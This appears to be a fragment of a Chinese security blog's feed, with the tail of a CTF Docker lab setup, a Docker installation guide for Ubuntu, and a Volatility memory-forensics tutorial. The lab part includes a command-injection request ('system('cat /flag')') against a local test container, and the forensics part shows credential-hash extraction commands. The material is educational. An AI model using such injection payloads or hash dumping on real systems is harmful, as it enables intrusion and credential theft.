class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.182.130:8080/rce.php?c=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>flag&#123;test_flag&#125;<br></code></pre></td></tr></table></figure><p>8.如果ctf题目源码过多，可以拷贝到container的主目录中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker cp ctfFile 941e5ff0bd2f:var/www/html<br></code></pre></td></tr></table></figure><p>10.导出容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker <span class="hljs-built_in">export</span> 941e5ff0bd2f &gt; ctf.tar<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装docker&quot;&gt;&lt;a href=&quot;#安装docker&quot; class=&quot;headerlink&quot; title=&quot;安装docker&quot;&gt;&lt;/a&gt;安装docker&lt;/h1&gt;&lt;p&gt;1、curl -fsSL &lt;a href=&quot;https://download.docker.</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="Dcoker" scheme="https://swhat.github.io/tags/Dcoker/"/>
    
  </entry>
  
  <entry>
    <title>Docker-安装</title>
    <link href="https://swhat.github.io/2021/06/21/Docker-%E5%AE%89%E8%A3%85/"/>
    <id>https://swhat.github.io/2021/06/21/Docker-%E5%AE%89%E8%A3%85/</id>
    <published>2021-06-21T04:26:42.000Z</published>
    <updated>2021-11-27T12:16:15.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Docker"><a href="#0x01-Docker" class="headerlink" title="0x01-Docker"></a>0x01-Docker</h2><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。</p><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p><h2 id="0x02-Docker-架构"><a href="#0x02-Docker-架构" class="headerlink" title="0x02-Docker 架构"></a>0x02-Docker 架构</h2><h3 id="Docker基本概念"><a href="#Docker基本概念" class="headerlink" title="Docker基本概念"></a>Docker基本概念</h3><p>Docker 包括三个基本概念：</p><ul><li><p>镜像(Image)</p></li><li><p>容器(Container)</p></li><li><p>仓库(Repository)</p></li></ul><p>理解了这三个概念，就理解了 Docker 的整个生命周期。</p><p><strong>1、镜像（image)：</strong></p><p>类似于虚拟机中的镜像，是一个包含有文件系统的面向 docker 引擎的只读模板。任何应用程序运行都需要环境，而镜像就是用来提供这种运行环境的。例如一个 Ubuntu 镜像就是一个包含 Ubuntu 操作系统环境的模板。</p><p><strong>2、容器(container)：</strong></p><p>镜像和容器的关系，就像是面向对象程序设计中的 “类” 和 “实例” 一样，镜像是静态的定义，容器是镜像运行时的实体。可以将其看作一个简易的Linux系统 以及运行在其中的应用程序。Docker利用容器来运行、隔离各个应用。容器是镜像创建的应用实例，可以创建、启动、停止、删除容器，各个容器之间是是相互隔离的，互不影响。</p><p><strong>3、仓库(repository)</strong></p><p>仓库就是用来集中存放镜像文件的地方。类似于代码仓库，这里是镜像仓库，分为公有仓库和私有仓库。注意与注册服务器（Registry）的区别：注册服务器是存放仓库的地方，一般会有多个仓库；而仓库是存放镜像的地方，一般每个仓库存放一类镜像，每个镜像利用 tag 进行区分，比如 Ubuntu 仓库存放有多个版本（12.04、14.04等）的 Ubuntu 镜像。</p><p>目前最用的 Registry 是官方的 Docker Hub，这也是默认的 Registry，拥有大量的高质量的官方镜像 。除此以外，还有 Red Hat 的 Quay.io ；Google 的 Google Container Registry，Kubernetes (K8s) 的镜像使用的就是这个服务；以及代码托管平台 GitHub 推出的 ghcr.io。</p><h3 id="Docker基本组成"><a href="#Docker基本组成" class="headerlink" title="Docker基本组成"></a>Docker基本组成</h3><p>Docker主要由五部分组成：</p><ul><li><p>Docker 镜像(Images)</p></li><li><p>Docker 容器(Container)</p></li><li><p>Docker客户端(Client)</p></li><li><p>Docker主机(Host)</p></li><li><p>Docker Registry</p></li><li><p>Docker Machine</p></li></ul><p>如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12572139/1638014213056-c3d583c1-3dd8-40d0-ae83-a8ff9b1bf70d.png" alt="img"></p><h2 id="0x03-docker安装"><a href="#0x03-docker安装" class="headerlink" title="0x03-docker安装"></a>0x03-docker安装</h2><p>本文以Ubuntu为例</p><p>参考： <a href="http://www.runoob.com/docker/ubuntu-docker-install.html">http://www.runoob.com/docker/ubuntu-docker-install.html</a></p><p>环境准备： Linux要求内核3.0以上</p><p>查询内核版本命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">uname -r<br></code></pre></td></tr></table></figure><h3 id="第一步：卸载旧版本"><a href="#第一步：卸载旧版本" class="headerlink" title="第一步：卸载旧版本"></a>第一步：卸载旧版本</h3><p>Docker 的旧版本被称为 docker，docker.io 或 docker-engine 。如果已安装，请卸载它们：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get remove docker docker-engine docker.io containerd runc<br></code></pre></td></tr></table></figure><p>当前称为 Docker Engine-Community 软件包 docker-ce 。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="第二步：更新apt包索引和安装包"><a href="#第二步：更新apt包索引和安装包" class="headerlink" title="第二步：更新apt包索引和安装包"></a>第二步：更新apt包索引和安装包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get update<br></code></pre></td></tr></table></figure><h3 id="第三步：安装-apt-依赖包"><a href="#第三步：安装-apt-依赖包" class="headerlink" title="第三步：安装 apt 依赖包"></a>第三步：安装 apt 依赖包</h3><p>用于通过HTTPS来获取仓库，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sudo</span> apt-get install \<br>    apt-transport-https \<br>    ca-certificates \<br>    curl \<br>    gnupg \<br>    lsb-release<br></code></pre></td></tr></table></figure><h3 id="第四步：添加-Docker-的官方-GPG-密钥"><a href="#第四步：添加-Docker-的官方-GPG-密钥" class="headerlink" title="第四步：添加 Docker 的官方 GPG 密钥"></a>第四步：添加 Docker 的官方 GPG 密钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -<br><br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg<br></code></pre></td></tr></table></figure><p>9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-key fingerprint 0EBFCD88<br><br>pub   rsa4096 2017-02-22 [SCEA]<br>9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88<br>uid           [ unknown] Docker Release (CE deb) &lt;docker@docker.com&gt;<br>sub   rsa4096 2017-02-22 [S]<br></code></pre></td></tr></table></figure><p>–使用以下指令设置稳定版仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo add-apt-repository \<br><span class="hljs-string">&quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \</span><br><span class="hljs-string">  <span class="hljs-subst">$(lsb_release -cs)</span> \</span><br><span class="hljs-string">  stable&quot;</span><br></code></pre></td></tr></table></figure><h3 id="第五步：设置镜像的仓库"><a href="#第五步：设置镜像的仓库" class="headerlink" title="第五步：设置镜像的仓库"></a>第五步：设置镜像的仓库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo \<br>  &quot;deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu \<br>  $(lsb_release -cs) stable&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null<br></code></pre></td></tr></table></figure><p>这里默认是从国外的，不推荐，推荐使用国内的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo \<br>  &quot;deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg]  http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu\<br>   $(lsb_release -cs) stable&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null<br></code></pre></td></tr></table></figure><h3 id="第六步：更新apt包索引"><a href="#第六步：更新apt包索引" class="headerlink" title="第六步：更新apt包索引"></a>第六步：更新apt包索引</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br></code></pre></td></tr></table></figure><h3 id="第七步：安装最新版本的Docker-Engine和containerd"><a href="#第七步：安装最新版本的Docker-Engine和containerd" class="headerlink" title="第七步：安装最新版本的Docker Engine和containerd"></a>第七步：安装最新版本的Docker Engine和containerd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install docker-ce docker-ce-cli containerd.io <span class="hljs-comment"># docker-ce 社区版 而ee是企业版</span><br></code></pre></td></tr></table></figure><h3 id="第八步：启动docker"><a href="#第八步：启动docker" class="headerlink" title="第八步：启动docker"></a>第八步：启动docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl start docker<br></code></pre></td></tr></table></figure><h3 id="第九步：查看是否安装成功"><a href="#第九步：查看是否安装成功" class="headerlink" title="第九步：查看是否安装成功"></a>第九步：查看是否安装成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker version<br></code></pre></td></tr></table></figure><h3 id="第十步：测试-hello-world"><a href="#第十步：测试-hello-world" class="headerlink" title="第十步：测试 hello-world"></a>第十步：测试 hello-world</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker run hello-world<br></code></pre></td></tr></table></figure><h3 id="第十一步：阿里云镜像加速"><a href="#第十一步：阿里云镜像加速" class="headerlink" title="第十一步：阿里云镜像加速"></a>第十一步：阿里云镜像加速</h3><p>因为默认的 docker 仓库是国外的，所以这里把仓库改为aliyun的。</p><p>打开阿里云镜像加速器网页：<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkdir -p /etc/docker<br><br>sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://mirror.aliyuncs.com&quot;</span>]<br>&#125;<br>EOF<br><br>sudo systemctl daemon-reload<br><br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-Docker&quot;&gt;&lt;a href=&quot;#0x01-Docker&quot; class=&quot;headerlink&quot; title=&quot;0x01-Docker&quot;&gt;&lt;/a&gt;0x01-Docker&lt;/h2&gt;&lt;p&gt;Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 A</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="Dcoker" scheme="https://swhat.github.io/tags/Dcoker/"/>
    
  </entry>
  
  <entry>
    <title>Volatility内存取证</title>
    <link href="https://swhat.github.io/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <id>https://swhat.github.io/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</id>
    <published>2021-06-03T13:02:15.000Z</published>
    <updated>2021-08-15T03:59:06.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装Volatility"><a href="#安装Volatility" class="headerlink" title="安装Volatility"></a>安装Volatility</h2><p>新版kali不自带Volatility，需要自己安装源码编译</p><p>1.下载源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//pan.baidu.com/s/1r-9VC3aG-sP6wWziYNvXxA  </span><br><br>提取码：<span class="hljs-number">4</span>d4w<br></code></pre></td></tr></table></figure><p>2.安装依赖</p><ul><li>crypto库安装</li></ul><p>安装pycryptodome</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">pip2 install pycryptodome -i https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-comment">#如果不指定国内源，可能会出现超时错误HTTPSConnectionPool</span><br></code></pre></td></tr></table></figure><ul><li>distorm3库安装</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">项目地址<br>https:<span class="hljs-comment">//github.com/vext01/distorm3</span><br></code></pre></td></tr></table></figure><p>解压到kali里面之后用命令 python setup.py install 编译</p><p>输入pip2 list查看是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Package      Version<br>------------ -------<br>cffi         1.14.0<br>distorm3     2<br>pip          20.3.4<br>pycryptodome 3.10.1<br>setuptools   18.5<br>volatility   2.6<br>wheel        0.29.0<br></code></pre></td></tr></table></figure><p>3.安装Volatility<br>将前面下载的项目，解压之后在Volatility中打开终端进行编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python setup.py install <br></code></pre></td></tr></table></figure><p>最后输入vol.py -h测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/volatility2.6]<br>└─<span class="hljs-comment"># vol.py -h                                                            </span><br>Volatility Foundation Volatility Framework 2.6<br>Usage: Volatility - A memory forensics analysis platform.<br><br>Options:<br>  -h, --<span class="hljs-built_in">help</span>            list all available options and their default values.<br>                        Default values may be <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> the configuration file<br>                        (/etc/volatilityrc)<br>  --conf-file=/root/.volatilityrc<br>                        User based configuration file<br>  -d, --debug           Debug volatility<br>  --plugins=PLUGINS     Additional plugin directories to use (colon separated)<br>  --info                Print information about all registered objects<br>  --cache-directory=/root/.cache/volatility<br>                        Directory <span class="hljs-built_in">where</span> cache files are stored<br>  --cache               Use caching<br>  --tz=TZ               Sets the (Olson) timezone <span class="hljs-keyword">for</span> displaying timestamps<br>                        using pytz (<span class="hljs-keyword">if</span> installed) or tzset<br>  -f FILENAME, --filename=FILENAME<br>                        Filename to use when opening an image<br>  --profile=WinXPSP2x86<br>                        Name of the profile to load (use --info to see a list<br>                        of supported profiles)<br>  -l LOCATION, --location=LOCATION<br>                        A URN location from <span class="hljs-built_in">which</span> to load an address space<br>  -w, --write           Enable write support<br>  --dtb=DTB             DTB Address<br>  --<span class="hljs-built_in">shift</span>=SHIFT         Mac KASLR <span class="hljs-built_in">shift</span> address<br>  --output=text         Output <span class="hljs-keyword">in</span> this format (support is module specific, see<br>                        the Module Output Options below)<br>  --output-file=OUTPUT_FILE<br>                        Write output <span class="hljs-keyword">in</span> this file<br>  -v, --verbose         Verbose information<br>  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: <span class="hljs-keyword">for</span> 64-bit<br>                        Windows 8 and above this is the address of<br>                        KdCopyDataBlock)<br>  --force               Force utilization of suspect profile<br>  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid <span class="hljs-keyword">for</span><br>                        Windows 10 only)<br>  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address<br><br>        Supported Plugin Commands:<br><br>                amcache         Print AmCache information<br>                apihooks        Detect API hooks <span class="hljs-keyword">in</span> process and kernel memory<br>                atoms           Print session and window station atom tables<br>                atomscan        Pool scanner <span class="hljs-keyword">for</span> atom tables<br>                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv<br>                bigpools        Dump the big page pools using BigPagePoolScanner<br>                bioskbd         Reads the keyboard buffer from Real Mode memory<br>                cachedump       Dumps cached domain hashes from memory<br>                callbacks       Print system-wide notification routines<br>                clipboard       Extract the contents of the windows clipboard<br>                cmdline         Display process command-line arguments<br>                cmdscan         Extract <span class="hljs-built_in">command</span> <span class="hljs-built_in">history</span> by scanning <span class="hljs-keyword">for</span> _COMMAND_HISTORY<br>                connections     Print list of open connections [Windows XP and 2003 Only]<br>                connscan        Pool scanner <span class="hljs-keyword">for</span> tcp connections<br>                consoles        Extract <span class="hljs-built_in">command</span> <span class="hljs-built_in">history</span> by scanning <span class="hljs-keyword">for</span> _CONSOLE_INFORMATION<br>                crashinfo       Dump crash-dump information<br>                deskscan        Poolscaner <span class="hljs-keyword">for</span> tagDESKTOP (desktops)<br>                devicetree      Show device tree<br>                dlldump         Dump DLLs from a process address space<br>                dlllist         Print list of loaded dlls <span class="hljs-keyword">for</span> each process<br>                driverirp       Driver IRP hook detection<br>                drivermodule    Associate driver objects to kernel modules<br>                driverscan      Pool scanner <span class="hljs-keyword">for</span> driver objects<br>                dumpcerts       Dump RSA private and public SSL keys<br>                dumpfiles       Extract memory mapped and cached files<br>                dumpregistry    Dumps registry files out to disk <br>                editbox         Displays information about Edit controls. (Listbox experimental.)<br>                envars          Display process environment variables<br>                eventhooks      Print details on windows event hooks<br>                evtlogs         Extract Windows Event Logs (XP/2003 only)<br>                filescan        Pool scanner <span class="hljs-keyword">for</span> file objects<br>                gahti           Dump the USER handle <span class="hljs-built_in">type</span> information<br>                gditimers       Print installed GDI timers and callbacks<br>                gdt             Display Global Descriptor Table<br>                getservicesids  Get the names of services <span class="hljs-keyword">in</span> the Registry and <span class="hljs-built_in">return</span> Calculated SID<br>                getsids         Print the SIDs owning each process<br>                handles         Print list of open handles <span class="hljs-keyword">for</span> each process<br>                hashdump        Dumps passwords hashes (LM/NTLM) from memory<br>                hibinfo         Dump hibernation file information<br>                hivedump        Prints out a hive<br>                hivelist        Print list of registry hives.<br>                hivescan        Pool scanner <span class="hljs-keyword">for</span> registry hives<br>                hpakextract     Extract physical memory from an HPAK file<br>                hpakinfo        Info on an HPAK file<br>                idt             Display Interrupt Descriptor Table<br>                iehistory       Reconstruct Internet Explorer cache / <span class="hljs-built_in">history</span><br>                imagecopy       Copies a physical address space out as a raw DD image<br>                imageinfo       Identify information <span class="hljs-keyword">for</span> the image <br>                impscan         Scan <span class="hljs-keyword">for</span> calls to imported <span class="hljs-built_in">functions</span><br>                joblinks        Print process job link information<br>                kdbgscan        Search <span class="hljs-keyword">for</span> and dump potential KDBG values<br>                kpcrscan        Search <span class="hljs-keyword">for</span> and dump potential KPCR values<br>                ldrmodules      Detect unlinked DLLs<br>                lsadump         Dump (decrypted) LSA secrets from the registry<br>                machoinfo       Dump Mach-O file format information<br>                malfind         Find hidden and injected code<br>                mbrparser       Scans <span class="hljs-keyword">for</span> and parses potential Master Boot Records (MBRs) <br>                memdump         Dump the addressable memory <span class="hljs-keyword">for</span> a process<br>                memmap          Print the memory map<br>                messagehooks    List desktop and thread window message hooks<br>                mftparser       Scans <span class="hljs-keyword">for</span> and parses potential MFT entries <br>                moddump         Dump a kernel driver to an executable file sample<br>                modscan         Pool scanner <span class="hljs-keyword">for</span> kernel modules<br>                modules         Print list of loaded modules<br>                multiscan       Scan <span class="hljs-keyword">for</span> various objects at once<br>                mutantscan      Pool scanner <span class="hljs-keyword">for</span> mutex objects<br>                notepad         List currently displayed notepad text<br>                objtypescan     Scan <span class="hljs-keyword">for</span> Windows object <span class="hljs-built_in">type</span> objects<br>                patcher         Patches memory based on page scans<br>                poolpeek        Configurable pool scanner plugin<br>                printkey        Print a registry key, and its subkeys and values<br>                privs           Display process privileges<br>                procdump        Dump a process to an executable file sample<br>                pslist          Print all running processes by following the EPROCESS lists <br>                psscan          Pool scanner <span class="hljs-keyword">for</span> process objects<br>                pstree          Print process list as a tree<br>                psxview         Find hidden processes with various process listings<br>                qemuinfo        Dump Qemu information<br>                raw2dmp         Converts a physical memory sample to a windbg crash dump<br>                screenshot      Save a pseudo-screenshot based on GDI windows<br>                servicediff     List Windows services (ala Plugx)<br>                sessions        List details on _MM_SESSION_SPACE (user logon sessions)<br>                shellbags       Prints ShellBags info<br>                shimcache       Parses the Application Compatibility Shim Cache registry key<br>                shutdowntime    Print ShutdownTime of machine from registry<br>                sockets         Print list of open sockets<br>                sockscan        Pool scanner <span class="hljs-keyword">for</span> tcp socket objects<br>                ssdt            Display SSDT entries<br>                strings         Match physical offsets to virtual addresses (may take a <span class="hljs-keyword">while</span>, VERY verbose)<br>                svcscan         Scan <span class="hljs-keyword">for</span> Windows services<br>                symlinkscan     Pool scanner <span class="hljs-keyword">for</span> symlink objects<br>                thrdscan        Pool scanner <span class="hljs-keyword">for</span> thread objects<br>                threads         Investigate _ETHREAD and _KTHREADs<br>                timeliner       Creates a timeline from various artifacts <span class="hljs-keyword">in</span> memory <br>                timers          Print kernel timers and associated module DPCs<br>                truecryptmaster Recover TrueCrypt 7.1a Master Keys<br>                truecryptpassphrase     TrueCrypt Cached Passphrase Finder<br>                truecryptsummary        TrueCrypt Summary<br>                unloadedmodules Print list of unloaded modules<br>                userassist      Print userassist registry keys and information<br>                userhandles     Dump the USER handle tables<br>                vaddump         Dumps out the vad sections to a file<br>                vadinfo         Dump the VAD info<br>                vadtree         Walk the VAD tree and display <span class="hljs-keyword">in</span> tree format<br>                vadwalk         Walk the VAD tree<br>                vboxinfo        Dump virtualbox information<br>                verinfo         Prints out the version information from PE images<br>                vmwareinfo      Dump VMware VMSS/VMSN information<br>                volshell        Shell <span class="hljs-keyword">in</span> the memory image<br>                windows         Print Desktop Windows (verbose details)<br>                wintree         Print Z-Order Desktop Windows Tree<br>                wndscan         Pool scanner <span class="hljs-keyword">for</span> window stations<br>                yarascan        Scan process or kernel memory with Yara signatures<br><br></code></pre></td></tr></table></figure><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="0x00-查看镜像系统"><a href="#0x00-查看镜像系统" class="headerlink" title="0x00 - 查看镜像系统"></a>0x00 - 查看镜像系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; imageinfo  <span class="hljs-comment">#常见的内存镜像文件有raw、vmem、dmp、img等</span><br></code></pre></td></tr></table></figure><h3 id="0x01-查看用户名密码信息"><a href="#0x01-查看用户名密码信息" class="headerlink" title="0x01 - 查看用户名密码信息"></a>0x01 - 查看用户名密码信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hashdump<br></code></pre></td></tr></table></figure><h3 id="0x02-查看进程信息"><a href="#0x02-查看进程信息" class="headerlink" title="0x02 - 查看进程信息"></a>0x02 - 查看进程信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pslist<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pstree <span class="hljs-comment">#可以识别子进程和父进程，且可以显示出被隐藏的病毒</span><br></code></pre></td></tr></table></figure><h3 id="0x03-扫描所有的文件列表"><a href="#0x03-扫描所有的文件列表" class="headerlink" title="0x03 - 扫描所有的文件列表"></a>0x03 - 扫描所有的文件列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 